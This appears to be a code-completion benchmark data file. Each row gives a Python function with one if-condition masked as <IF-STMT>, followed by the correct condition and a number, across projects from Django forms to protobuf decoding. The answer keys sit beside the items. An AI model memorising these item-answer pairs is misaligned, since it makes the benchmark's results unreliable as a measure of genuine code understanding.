4106,"def get_and_set_titles(self):<tab>all_titles = []<tab>for page in self.pages:<tab><tab>if page.orig_phrase != """":<tab><tab><tab>all_titles.append(page.orig_phrase)<tab><tab><tab>all_titles.append(page.orig_phrase_norm)<tab><tab><IF-STMT><tab><tab><tab>all_titles.append(page.wiki_title)<tab><tab><tab>all_titles.append(page.wiki_title_norm)<tab>return set(all_titles)","if page . wiki_title != """" :",127
4107,"def spool_print(*args, **kwargs):<tab>with _print_lock:<tab><tab><IF-STMT><tab><tab><tab>framework.Framework._spool.write(f""{args[0]}{os.linesep}"")<tab><tab><tab>framework.Framework._spool.flush()<tab><tab># disable terminal output for server jobs<tab><tab>if framework.Framework._mode == Mode.JOB:<tab><tab><tab>return<tab><tab># new print function must still use the old print function via the backup<tab><tab>builtins._print(*args, **kwargs)",if framework . Framework . _spool :,126
4108,"def matches(self, filepath):<tab>matched = False<tab>parent_path = os.path.dirname(filepath)<tab>parent_path_dirs = split_path(parent_path)<tab>for pattern in self.patterns:<tab><tab>negative = pattern.exclusion<tab><tab>match = pattern.match(filepath)<tab><tab><IF-STMT><tab><tab><tab>if len(pattern.dirs) <= len(parent_path_dirs):<tab><tab><tab><tab>match = pattern.match(<tab><tab><tab><tab><tab>os.path.sep.join(parent_path_dirs[: len(pattern.dirs)])<tab><tab><tab><tab>)<tab><tab>if match:<tab><tab><tab>matched = not negative<tab>return matched","if not match and parent_path != """" :",165
4109,"def __str__(self, prefix="""", printElemNumber=0):<tab>res = """"<tab>cnt = 0<tab>for e in self.task_:<tab><tab>elm = """"<tab><tab><IF-STMT><tab><tab><tab>elm = ""(%d)"" % cnt<tab><tab>res += prefix + (""Task%s {\n"" % elm)<tab><tab>res += e.__str__(prefix + ""  "", printElemNumber)<tab><tab>res += prefix + ""}\n""<tab><tab>cnt += 1<tab>return res",if printElemNumber :,118
4110,"def when(self, matches, context):<tab>ret = []<tab>for to_check in matches.range(<tab><tab>predicate=lambda match: ""has-neighbor-before"" in match.tags<tab>):<tab><tab>next_match = matches.next(to_check, index=0)<tab><tab>next_group = matches.markers.next(<tab><tab><tab>to_check, lambda marker: marker.name == ""group"", 0<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>next_match = next_group<tab><tab>if next_match and not matches.input_string[<tab><tab><tab>to_check.end : next_match.start<tab><tab>].strip(seps):<tab><tab><tab>break<tab><tab>ret.append(to_check)<tab>return ret",if next_group and ( not next_match or next_group . start < next_match . start ) :,198
4111,"def get_coeffs(e):<tab>coeffs = []<tab>for du in all_delu_dict.keys():<tab><tab>if type(self.as_coeffs_dict[e]).__name__ == ""float"":<tab><tab><tab>coeffs.append(self.as_coeffs_dict[e])<tab><tab><IF-STMT><tab><tab><tab>coeffs.append(self.as_coeffs_dict[e][du])<tab><tab>else:<tab><tab><tab>coeffs.append(0)<tab>return np.array(coeffs)",elif du in self . as_coeffs_dict [ e ] . keys ( ) :,132
4112,"def clean(self):<tab>username = self.cleaned_data.get(""username"")<tab>password = self.cleaned_data.get(""password"")<tab>message = ERROR_MESSAGE<tab>if username and password:<tab><tab>self.user_cache = authenticate(username=username, password=password)<tab><tab>if self.user_cache is None:<tab><tab><tab>raise ValidationError(<tab><tab><tab><tab>message % {""username"": self.username_field.verbose_name}<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>raise ValidationError(<tab><tab><tab><tab>message % {""username"": self.username_field.verbose_name}<tab><tab><tab>)<tab>return self.cleaned_data",elif not self . user_cache . is_active or not self . user_cache . is_staff :,177
4113,"def moveFailedFolder(filepath, failed_folder):<tab>if config.Config().failed_move():<tab><tab>root_path = str(pathlib.Path(filepath).parent)<tab><tab>file_name = pathlib.Path(filepath).name<tab><tab>destination_path = root_path + ""/"" + failed_folder + ""/""<tab><tab><IF-STMT><tab><tab><tab>print(""[-]Create symlink to Failed output folder"")<tab><tab><tab>os.symlink(filepath, destination_path + ""/"" + file_name)<tab><tab>else:<tab><tab><tab>print(""[-]Move to Failed output folder"")<tab><tab><tab>shutil.move(filepath, destination_path)<tab>return",if config . Config ( ) . soft_link ( ) :,155
4114,"def test_save_mp3(self, test_mode, bit_rate):<tab>if test_mode in [""fileobj"", ""bytesio""]:<tab><tab><IF-STMT><tab><tab><tab>raise unittest.SkipTest(<tab><tab><tab><tab>""mp3 format with variable bit rate is known to ""<tab><tab><tab><tab>""not yield the exact same result as sox command.""<tab><tab><tab>)<tab>self.assert_save_consistency(""mp3"", compression=bit_rate, test_mode=test_mode)",if bit_rate is not None and bit_rate < 1 :,125
4115,"def _upstream_nodes_executed(self, node: pipeline_pb2.PipelineNode) -> bool:<tab>""""""Returns `True` if all the upstream nodes have been successfully executed.""""""<tab>upstream_nodes = [<tab><tab>node<tab><tab>for node_id, node in self._node_map.items()<tab><tab>if node_id in set(node.upstream_nodes)<tab>]<tab>if not upstream_nodes:<tab><tab>return True<tab>for node in upstream_nodes:<tab><tab>upstream_node_executions = task_gen_utils.get_executions(<tab><tab><tab>self._mlmd_handle, node<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return False<tab>return True",if not task_gen_utils . is_latest_execution_successful ( upstream_node_executions ) :,189
4116,"def reinit():<tab>for name, var in _ns_registry._registry[u""pixie.stdlib""]._registry.iteritems():<tab><tab>name = munge(name)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if var.is_defined() and isinstance(var.deref(), BaseCode):<tab><tab><tab>globals()[name] = unwrap(var)<tab><tab>else:<tab><tab><tab>globals()[name] = var",if name in globals ( ) :,102
4117,"def i2repr(self, pkt, x):<tab>if type(x) is list or type(x) is tuple:<tab><tab>return repr(x)<tab><IF-STMT><tab><tab>r = []<tab>else:<tab><tab>r = """"<tab>i = 0<tab>while x:<tab><tab>if x & 1:<tab><tab><tab>if self.multi:<tab><tab><tab><tab>r += [self.names[i]]<tab><tab><tab>else:<tab><tab><tab><tab>r += self.names[i]<tab><tab>i += 1<tab><tab>x >>= 1<tab>if self.multi:<tab><tab>r = ""+"".join(r)<tab>return r",if self . multi :,154
4118,"def prompts_dict(self, *args, **kwargs):<tab>r = super(WorkflowJobNode, self).prompts_dict(*args, **kwargs)<tab># Explanation - WFJT extra_vars still break pattern, so they are not<tab># put through prompts processing, but inventory and others are only accepted<tab># if JT prompts for it, so it goes through this mechanism<tab>if self.workflow_job:<tab><tab>if self.workflow_job.inventory_id:<tab><tab><tab># workflow job inventory takes precedence<tab><tab><tab>r[""inventory""] = self.workflow_job.inventory<tab><tab><IF-STMT><tab><tab><tab>r.update(self.workflow_job.char_prompts)<tab>return r",if self . workflow_job . char_prompts :,175
4119,"def did_evm_write_storage_callback(self, state, address, offset, value):<tab># if in potential DAO check that write to storage values read before<tab># the ""send""<tab>for location, reads in self._get_location_and_reads(state):<tab><tab>for address_i, offset_i in reads:<tab><tab><tab>if address_i == address:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self.add_finding(state, *location)",if state . can_be_true ( offset == offset_i ) :,128
4120,"def update_quality_inspection(self):<tab>if self.inspection_required:<tab><tab>reference_type = reference_name = """"<tab><tab><IF-STMT><tab><tab><tab>reference_name = self.name<tab><tab><tab>reference_type = ""Stock Entry""<tab><tab>for d in self.items:<tab><tab><tab>if d.quality_inspection:<tab><tab><tab><tab>frappe.db.set_value(<tab><tab><tab><tab><tab>""Quality Inspection"",<tab><tab><tab><tab><tab>d.quality_inspection,<tab><tab><tab><tab><tab>{<tab><tab><tab><tab><tab><tab>""reference_type"": reference_type,<tab><tab><tab><tab><tab><tab>""reference_name"": reference_name,<tab><tab><tab><tab><tab>},<tab><tab><tab><tab>)",if self . docstatus == 1 :,178
4121,"def _target(self):<tab><IF-STMT><tab><tab>self.setup.push_thread()<tab>try:<tab><tab>while self.running:<tab><tab><tab>record = self.subscriber.recv()<tab><tab><tab>if record:<tab><tab><tab><tab>try:<tab><tab><tab><tab><tab>self.queue.put(record, timeout=0.05)<tab><tab><tab><tab>except Full:<tab><tab><tab><tab><tab>pass<tab>finally:<tab><tab>if self.setup is not None:<tab><tab><tab>self.setup.pop_thread()",if self . setup is not None :,128
4122,"def check(self):<tab>global MySQLdb<tab>import MySQLdb<tab>try:<tab><tab>args = {}<tab><tab><IF-STMT><tab><tab><tab>args[""user""] = mysql_user<tab><tab>if mysql_pwd:<tab><tab><tab>args[""passwd""] = mysql_pwd<tab><tab>if mysql_host:<tab><tab><tab>args[""host""] = mysql_host<tab><tab>if mysql_port:<tab><tab><tab>args[""port""] = mysql_port<tab><tab>if mysql_socket:<tab><tab><tab>args[""unix_socket""] = mysql_socket<tab><tab>self.db = MySQLdb.connect(**args)<tab>except Exception as e:<tab><tab>raise Exception(""Cannot interface with MySQL server: %s"" % e)",if mysql_user :,167
4123,"def writeBool(self, bool):<tab>if self.state == BOOL_WRITE:<tab><tab><IF-STMT><tab><tab><tab>ctype = CompactType.TRUE<tab><tab>else:<tab><tab><tab>ctype = CompactType.FALSE<tab><tab>self.__writeFieldHeader(ctype, self.__bool_fid)<tab>elif self.state == CONTAINER_WRITE:<tab><tab>if bool:<tab><tab><tab>self.__writeByte(CompactType.TRUE)<tab><tab>else:<tab><tab><tab>self.__writeByte(CompactType.FALSE)<tab>else:<tab><tab>raise AssertionError(""Invalid state in compact protocol"")",if bool :,141
4124,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab><IF-STMT><tab><tab><tab>self.set_module(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 18:<tab><tab><tab>self.set_version(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 24:<tab><tab><tab>self.set_instances(d.getVarInt64())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 10 :,150
4125,"def init_panel(self):<tab>if not hasattr(self, ""output_view""):<tab><tab><IF-STMT><tab><tab><tab>self.output_view = self.window.create_output_panel(""markdown"")<tab><tab>else:<tab><tab><tab>self.output_view = self.window.get_output_panel(""markdown"")",if is_ST3 ( ) :,79
4126,"def sql(self, engine):<tab>adapter = get_adapter(engine)<tab>tokens = [self.name, adapter.type_to_sql(self.type, self.limit)]<tab>for k, v in self.options.items():<tab><tab>result = adapter.column_option_to_sql(self.name, k, v)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>elif isinstance(result, dict):  # a way for column options to add constraints<tab><tab><tab>self.constraints.append(result[""constraint""])<tab><tab>else:<tab><tab><tab>tokens.append(result)<tab>return "" "".join(tokens)",if result is None :,150
4127,def get_igst_invoices(self):<tab>self.igst_invoices = []<tab>for d in self.tax_details:<tab><tab>is_igst = True if d[1] in self.gst_accounts.igst_account else False<tab><tab><IF-STMT><tab><tab><tab>self.igst_invoices.append(d[0]),if is_igst and d [ 0 ] not in self . igst_invoices :,102
4128,"def updateParticle(part, best, phi1, phi2):<tab>u1 = numpy.random.uniform(0, phi1, len(part))<tab>u2 = numpy.random.uniform(0, phi2, len(part))<tab>v_u1 = u1 * (part.best - part)<tab>v_u2 = u2 * (best - part)<tab>part.speed += v_u1 + v_u2<tab>for i, speed in enumerate(part.speed):<tab><tab>if abs(speed) < part.smin:<tab><tab><tab>part.speed[i] = math.copysign(part.smin, speed)<tab><tab><IF-STMT><tab><tab><tab>part.speed[i] = math.copysign(part.smax, speed)<tab>part += part.speed",elif abs ( speed ) > part . smax :,197
4129,"def summaries_with_matching_keyword(keyword, summary_dir):<tab>""""""Yields summary protos matching given keyword from event file.""""""<tab>event_paths = tf.io.gfile.glob(os.path.join(summary_dir, ""events*""))<tab>for event in tf.compat.v1.train.summary_iterator(event_paths[-1]):<tab><tab><IF-STMT><tab><tab><tab>for value in event.summary.value:<tab><tab><tab><tab>if keyword in value.tag:<tab><tab><tab><tab><tab>logging.error(event)<tab><tab><tab><tab><tab>yield event.summary",if event . summary is not None :,139
4130,"def _RemoveToken(self, doc_id, token):<tab>""""""Removes a token occurrence for a document.""""""<tab>if token in self._inverted_index:<tab><tab>postings = self._inverted_index[token]<tab><tab>postings.Remove(doc_id, token.position)<tab><tab><IF-STMT><tab><tab><tab>del self._inverted_index[token]",if not postings . postings :,90
4131,"def check_recursive_filters(self, space, name):<tab>for the_filter in self.filterdb.get_filters(space):<tab><tab>for rule in the_filter.get_rules():<tab><tab><tab>values = list(rule.values())<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True<tab>return False","if issubclass ( rule . __class__ , MatchesFilterBase ) and ( name in values ) :",91
4132,"def main():<tab>for filename in sys.argv[1:]:<tab><tab>if os.path.isdir(filename):<tab><tab><tab>print(filename, ""Directory!"")<tab><tab><tab>continue<tab><tab>with open(filename, ""rb"") as f:<tab><tab><tab>data = f.read()<tab><tab><IF-STMT><tab><tab><tab>print(filename, ""Binary!"")<tab><tab><tab>continue<tab><tab>newdata = data.replace(b""\r\n"", b""\n"")<tab><tab>if newdata != data:<tab><tab><tab>print(filename)<tab><tab><tab>with open(filename, ""wb"") as f:<tab><tab><tab><tab>f.write(newdata)","if b""\0"" in data :",157
4133,"def fit(self, dataset, intent):<tab>self.language = dataset[""language""]<tab>self.slots_keywords = dict()<tab>utterances = dataset[""intents""][intent][""utterances""]<tab>for utterance in utterances:<tab><tab>for chunk in utterance[""data""]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>text = chunk[""text""]<tab><tab><tab><tab>if self.config.get(""lowercase"", False):<tab><tab><tab><tab><tab>text = text.lower()<tab><tab><tab><tab>self.slots_keywords[text] = [chunk[""entity""], chunk[""slot_name""]]<tab>return self","if ""slot_name"" in chunk :",141
4134,"def linkGradient(self, slaveGradient, connect=True):<tab>if connect:<tab><tab>fn = lambda g, slave=slaveGradient: slave.restoreState(g.saveState())<tab><tab>self.linkedGradients[id(slaveGradient)] = fn<tab><tab>self.sigGradientChanged.connect(fn)<tab><tab>self.sigGradientChanged.emit(self)<tab>else:<tab><tab>fn = self.linkedGradients.get(id(slaveGradient), None)<tab><tab><IF-STMT><tab><tab><tab>self.sigGradientChanged.disconnect(fn)",if fn :,129
4135,"def _get_field_values(serial_str, field_name):<tab>ret_list = []<tab>stream = StringIO(serial_str)<tab>for obj_dict in yaml.safe_load(stream):<tab><tab><IF-STMT><tab><tab><tab>field_value = obj_dict[""fields""][field_name]<tab><tab><tab># yaml.safe_load will return non-string objects for some<tab><tab><tab># of the fields we are interested in, this ensures that<tab><tab><tab># everything comes back as a string<tab><tab><tab>if isinstance(field_value, six.string_types):<tab><tab><tab><tab>ret_list.append(field_value)<tab><tab><tab>else:<tab><tab><tab><tab>ret_list.append(str(field_value))<tab>return ret_list","if ""fields"" in obj_dict and field_name in obj_dict [ ""fields"" ] :",195
4136,"def scrapeHeadlines(text):<tab>headlines = """"<tab>lines = text.splitlines()<tab>for line in lines:<tab><tab>if string.find(line, ""<a href"") == 0:<tab><tab><tab>pos1 = string.find(line, ""<b>"")<tab><tab><tab>if pos1 > 0:<tab><tab><tab><tab>pos2 = string.find(line, ""</b>"")<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>headlines += line[pos1 + len(""<b>"") : pos2] + "".\n""<tab>return headlines",if pos2 > 0 :,133
4137,"def getCVEActions(self, cve, **args):<tab>actions = []<tab>for plugin in self.getWebPlugins():<tab><tab>try:<tab><tab><tab>actions_ = plugin.getCVEActions(cve, **args)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>for action in actions_:<tab><tab><tab><tab><tab>action[""auth""] = plugin.requiresAuth<tab><tab><tab><tab><tab>action[""plugin""] = plugin.getUID()<tab><tab><tab><tab><tab>actions.append(action)<tab><tab>except Exception as e:<tab><tab><tab>print(""[!] Plugin %s failed on fetching CVE actions!"" % plugin.getName())<tab><tab><tab>print(""[!]  -> %s"" % e)<tab>return actions",if actions_ :,166
4138,"def _sensors_to_fields(oldrec, sensor_map):<tab># map a record with observation names to a record with db field names<tab>if oldrec:<tab><tab>newrec = dict()<tab><tab>for k in sensor_map:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>newrec[k] = oldrec[sensor_map[k]]<tab><tab>if newrec:<tab><tab><tab>newrec[""dateTime""] = oldrec[""dateTime""]<tab><tab><tab>newrec[""usUnits""] = oldrec[""usUnits""]<tab><tab><tab>return newrec<tab>return None",if sensor_map [ k ] in oldrec :,146
4139,"def rdd_generator():<tab>while not tf_feed.should_stop():<tab><tab>batch = tf_feed.next_batch(1)<tab><tab><IF-STMT><tab><tab><tab>features = batch[""x""][0]<tab><tab><tab>label = batch[""y_""][0]<tab><tab><tab>yield (features, label)<tab><tab>else:<tab><tab><tab>return","if len ( batch [ ""x"" ] ) > 0 :",92
4140,"def _get_modules(fn):<tab>finder = modulefinder.ModuleFinder()<tab>finder.run_script(fn)<tab>all = []<tab>for m in finder.modules.values():<tab><tab>if not isinstance(m, modulefinder.Module):<tab><tab><tab>continue<tab><tab>if not m.__file__:<tab><tab><tab>continue<tab><tab># skip shared object files<tab><tab>if m.__file__.endswith("".so""):<tab><tab><tab>continue<tab><tab># skip mac system stuff...<tab><tab># FIXME: would need to augment with  other OS's system stuff<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>all.append(m)<tab>return all","if m . __file__ . startswith ( ""/Library/Frameworks"" ) :",162
4141,"def clean(self):<tab>d = super().clean()<tab>if d[""issue_giftcard""]:<tab><tab>if d[""tax_rule""] and d[""tax_rule""].rate > 0:<tab><tab><tab>self.add_error(<tab><tab><tab><tab>""tax_rule"",<tab><tab><tab><tab>_(<tab><tab><tab><tab><tab>""Gift card products should not be associated with non-zero tax rates since sales tax will be applied when the gift card is redeemed.""<tab><tab><tab><tab>),<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>self.add_error(<tab><tab><tab><tab>""admission"",<tab><tab><tab><tab>_(<tab><tab><tab><tab><tab>""Gift card products should not be admission products at the same time.""<tab><tab><tab><tab>),<tab><tab><tab>)<tab>return d","if d [ ""admission"" ] :",184
4142,"def is_filtered_inherited_member(name: str, obj: Any) -> bool:<tab>if inspect.isclass(self.object):<tab><tab>for cls in self.object.__mro__:<tab><tab><tab>if cls.__name__ == self.options.inherited_members and cls != self.object:<tab><tab><tab><tab># given member is a member of specified *super class*<tab><tab><tab><tab>return True<tab><tab><tab>elif name in cls.__dict__:<tab><tab><tab><tab>return False<tab><tab><tab>elif name in self.get_attr(cls, ""__annotations__"", {}):<tab><tab><tab><tab>return False<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab>return False","elif isinstance ( obj , ObjectMember ) and obj . class_ is cls :",167
4143,"def dictToKW(d):<tab>out = []<tab>items = list(d.items())<tab>items.sort()<tab>for k, v in items:<tab><tab>if not isinstance(k, str):<tab><tab><tab>raise NonFormattableDict(""%r ain't a string"" % k)<tab><tab><IF-STMT><tab><tab><tab>raise NonFormattableDict(""%r ain't an identifier"" % k)<tab><tab>out.append(""\n\0{}={},"".format(k, prettify(v)))<tab>return """".join(out)",if not r . match ( k ) :,131
4144,"def report_add_status(torrentlist, succ_cnt, fail_cnt, fail_msgs):<tab>if fail_cnt == 0:<tab><tab>torrentlist.report_message(<tab><tab><tab>""Torrents Added"", ""{!success!}Successfully added %d torrent(s)"" % succ_cnt<tab><tab>)<tab>else:<tab><tab>msg = (<tab><tab><tab>""{!error!}Failed to add the following %d torrent(s):\n {!input!}"" % fail_cnt<tab><tab>) + ""\n "".join(fail_msgs)<tab><tab><IF-STMT><tab><tab><tab>msg += ""\n \n{!success!}Successfully added %d torrent(s)"" % succ_cnt<tab><tab>torrentlist.report_message(""Torrent Add Report"", msg)",if succ_cnt != 0 :,184
4145,"def merge(self, other):<tab>d = self._name2ft<tab>for name, (f, t) in other._name2ft.items():<tab><tab><IF-STMT><tab><tab><tab># Don't print here by default, since doing<tab><tab><tab>#<tab> so breaks some of the buildbots<tab><tab><tab># print(""*** DocTestRunner.merge: '"" + name + ""' in both"" \<tab><tab><tab>#<tab>"" testers; summing outcomes."")<tab><tab><tab>f2, t2 = d[name]<tab><tab><tab>f = f + f2<tab><tab><tab>t = t + t2<tab><tab>d[name] = f, t",if name in d :,156
4146,"def handle_command(self, parameters):<tab>response = """"<tab>for ip_token in parameters:<tab><tab><IF-STMT><tab><tab><tab>ip = netaddr.IPNetwork(ip_token)[0]<tab><tab><tab>if not (ip.is_loopback() or ip.is_private() or ip.is_reserved()):<tab><tab><tab><tab>response += ""{0} location: {1}\n"".format(<tab><tab><tab><tab><tab>ip_token, ip_location(ip_token)<tab><tab><tab><tab>)<tab><tab><tab>else:<tab><tab><tab><tab>response += ""{0}: hrm...loopback? private ip?\n"".format(ip_token)<tab><tab>else:<tab><tab><tab>response = ""{0} is not an IP address"".format(ip_token)<tab>return response",if is_ip ( ip_token ) :,186
4147,"def letterrange(first, last, charset):<tab>for k in range(len(last)):<tab><tab>for x in product(*[chain(charset)] * (k + 1)):<tab><tab><tab>result = """".join(x)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if first != result:<tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>first = None<tab><tab><tab>yield result<tab><tab><tab>if result == last:<tab><tab><tab><tab>return",if first :,112
4148,"def artifacts_base_dir(self):<tab>if not self._artifacts_base_dir:<tab><tab>try:<tab><tab><tab>artifacts_base_dir = os.path.abspath(<tab><tab><tab><tab>self.get_option(self.SECTION, ""artifacts_base_dir"")<tab><tab><tab>)<tab><tab>except ValidationError:<tab><tab><tab>artifacts_base_dir = os.path.abspath(""logs"")<tab><tab><IF-STMT><tab><tab><tab>os.makedirs(artifacts_base_dir)<tab><tab><tab>os.chmod(self.artifacts_base_dir, 0o755)<tab><tab>self._artifacts_base_dir = artifacts_base_dir<tab>return self._artifacts_base_dir",if not os . path . exists ( artifacts_base_dir ) :,172
4149,"def _extract_changes(doc_map, changes, read_time):<tab>deletes = []<tab>adds = []<tab>updates = []<tab>for name, value in changes.items():<tab><tab>if value == ChangeType.REMOVED:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>deletes.append(name)<tab><tab>elif name in doc_map:<tab><tab><tab>if read_time is not None:<tab><tab><tab><tab>value.read_time = read_time<tab><tab><tab>updates.append(value)<tab><tab>else:<tab><tab><tab>if read_time is not None:<tab><tab><tab><tab>value.read_time = read_time<tab><tab><tab>adds.append(value)<tab>return (deletes, adds, updates)",if name in doc_map :,173
4150,"def __setattr__(self, name, val):<tab>BitmapSprite.__setattr__(self, name, val)<tab>if name in (<tab><tab>""name"",<tab><tab>""size"",<tab>):  # no other reason to discard cache than just on path change<tab><tab><IF-STMT><tab><tab><tab>self.image_data = self.theme.load_icon(self.name, self.size, 0)<tab><tab>else:<tab><tab><tab>self.image_data = None","if self . __dict__ . get ( ""name"" ) and self . __dict__ . get ( ""size"" ) :",125
4151,"def extract_deps(file):<tab># ~ print('Extracting from %s' % file)<tab>deps = set()<tab>for line in open(file).readlines():<tab><tab>line = line.strip()<tab><tab><IF-STMT><tab><tab><tab>words = line.split()<tab><tab><tab>if words[0] == ""import"" or (words[0] == ""from"" and words[2] == ""import""):<tab><tab><tab><tab>deps.add(words[1])<tab>return deps","if line . startswith ( ""import"" ) or line . startswith ( ""from"" ) :",124
4152,"def run_query(self, query, user):<tab>connection = self._get_connection()<tab>statement = None<tab>error = None<tab>try:<tab><tab>statement = connection.execute(query)<tab><tab>columns = [<tab><tab><tab>{""name"": n, ""friendly_name"": n, ""type"": _type_mapper(t)}<tab><tab><tab>for (n, t) in statement.columns().items()<tab><tab>]<tab><tab>cnames = statement.column_names()<tab><tab>rows = [dict(zip(cnames, row)) for row in statement]<tab><tab>data = {""columns"": columns, ""rows"": rows}<tab><tab>json_data = json_dumps(data)<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>statement.close()<tab><tab>connection.close()<tab>return json_data, error",if statement is not None :,197
4153,"def find_setup_py_above(a_file):<tab>""Return the directory containing setup.py somewhere above *a_file*""<tab>root = os.path.dirname(os.path.abspath(a_file))<tab>while not os.path.exists(os.path.join(root, ""setup.py"")):<tab><tab>prev, root = root, os.path.dirname(root)<tab><tab><IF-STMT><tab><tab><tab># Let's avoid infinite loops at root<tab><tab><tab>raise NoSetupPyFound(""could not find my setup.py above %r"" % (a_file,))<tab>return root",if root == prev :,142
4154,"def check_index(self, is_sorted=True, unique=True, index=None):<tab>""""""Sanity checks""""""<tab>if not index:<tab><tab>index = self.index<tab>if is_sorted:<tab><tab>test = pd.DataFrame(lrange(len(index)), index=index)<tab><tab>test_sorted = test.sort()<tab><tab>if not test.index.equals(test_sorted.index):<tab><tab><tab>raise Exception(""Data is not be sorted"")<tab>if unique:<tab><tab><IF-STMT><tab><tab><tab>raise Exception(""Duplicate index entries"")",if len ( index ) != len ( index . unique ( ) ) :,142
4155,"def _compare_address_strings(self, a, b):<tab># IPv6 address from different requests might be different<tab>a_segments = a.count("":"")<tab>b_segments = b.count("":"")<tab>if a_segments and b_segments:<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>if a.rstrip("":"").startswith(b.rstrip("":"")) or b.rstrip("":"").startswith(<tab><tab><tab>a.rstrip("":"")<tab><tab>):<tab><tab><tab>return True<tab><tab>if a_segments >= 2 and b_segments >= 2 and a.split("":"")[:2] == b.split("":"")[:2]:<tab><tab><tab>return True<tab>return a.split(""."", 1)[-1] == b.split(""."", 1)[-1]","if a_segments == b_segments and a_segments in ( 4 , 5 , 6 , 7 ) :",187
4156,"def collect(self):<tab>for vacb in self.GetVACBs():<tab><tab>filename = vacb.SharedCacheMap.FileObject.file_name_with_drive()<tab><tab><IF-STMT><tab><tab><tab>yield (<tab><tab><tab><tab>vacb,<tab><tab><tab><tab>bool(self.kernel_address_space.vtop(vacb.BaseAddress.v())),<tab><tab><tab><tab>vacb.BaseAddress.v(),<tab><tab><tab><tab>vacb.Overlay.FileOffset.QuadPart,<tab><tab><tab><tab>filename,<tab><tab><tab>)",if filename :,133
4157,"def _visit_table(self, expr):<tab>node = expr.op()<tab>if isinstance(expr, ir.TableExpr):<tab><tab>base_table = _find_blocking_table(expr)<tab><tab>if base_table is not None:<tab><tab><tab>base_node = base_table.op()<tab><tab><tab>if self._is_root(base_node):<tab><tab><tab><tab>pass<tab><tab><tab>else:<tab><tab><tab><tab># Foreign ref<tab><tab><tab><tab>self.foreign_table = expr<tab>else:<tab><tab><IF-STMT><tab><tab><tab>for arg in node.flat_args():<tab><tab><tab><tab>if isinstance(arg, ir.Expr):<tab><tab><tab><tab><tab>self._visit(arg)",if not node . blocks ( ) :,172
4158,"def channel_details(self) -> SnapChannelDetails:<tab>if self._channel_details is None:<tab><tab>channel = self._payload.get(""channel"")<tab><tab><IF-STMT><tab><tab><tab># Shouldn't happen, but raise an error if it does.<tab><tab><tab>raise RuntimeError(f""no channel found for {self._payload!r}"")<tab><tab>self._channel_details = SnapChannelDetails(channel)<tab>return self._channel_details",if channel is None :,107
4159,"def __setattr__(self, attr, val):<tab>if hasattr(self, attr):<tab><tab>old = getattr(self, attr)<tab><tab>if isinstance(old, Setting):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError(<tab><tab><tab><tab><tab>""Attempting to reassign setting %s with %s"" % (old, val)<tab><tab><tab><tab>)<tab><tab><tab>log.warn(""Setting attr %s via __setattr__ instead of set()!"", attr)<tab><tab><tab>return old.set(val)<tab>log.debug(""Setting {%s => %s}"" % (attr, val))<tab>return object.__setattr__(self, attr, val)","if isinstance ( val , Setting ) :",155
4160,"def FindEnclosingBracketGroup(input_str):<tab>stack = []<tab>start = -1<tab>for index, char in enumerate(input_str):<tab><tab>if char in LBRACKETS:<tab><tab><tab>stack.append(char)<tab><tab><tab>if start == -1:<tab><tab><tab><tab>start = index<tab><tab>elif char in BRACKETS:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return (-1, -1)<tab><tab><tab>if stack.pop() != BRACKETS[char]:<tab><tab><tab><tab>return (-1, -1)<tab><tab><tab>if not stack:<tab><tab><tab><tab>return (start, index + 1)<tab>return (-1, -1)",if not stack :,163
4161,"def copy_layer(<tab>layer,<tab>keep_bias=True,<tab>name_template=None,<tab>weights=None,<tab>reuse_symbolic_tensors=True,<tab>**kwargs):<tab>config = layer.get_config()<tab>if name_template is None:<tab><tab>config[""name""] = None<tab>else:<tab><tab>config[""name""] = name_template % config[""name""]<tab>if keep_bias is False and config.get(""use_bias"", False):<tab><tab>config[""use_bias""] = False<tab><tab>if weights is None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>weights = layer.weights[:-1]<tab><tab><tab>else:<tab><tab><tab><tab>weights = layer.get_weights()[:-1]<tab>return get_layer_from_config(layer, config, weights=weights, **kwargs)",if reuse_symbolic_tensors :,200
4162,"def find_go_srcs(path):<tab>srcs, tests = [], []<tab>for name in os.listdir(path):<tab><tab>if name.startswith(""."") or not name.endswith("".go""):<tab><tab><tab>continue<tab><tab>if os.path.isfile(os.path.join(path, name)):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>tests.append(name)<tab><tab><tab>else:<tab><tab><tab><tab>srcs.append(name)<tab>return srcs, tests","if name . endswith ( ""_test.go"" ) :",120
4163,"def first_text(self, node):<tab>""""""find first paragraph to use as a summary""""""<tab>if node.tagname == ""paragraph"":<tab><tab>return deepcopy(node)<tab>else:<tab><tab>for child in node:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ans = self.first_text(child)<tab><tab><tab><tab>if ans:<tab><tab><tab><tab><tab>return ans<tab>return None","if hasattr ( child , ""tagname"" ) :",99
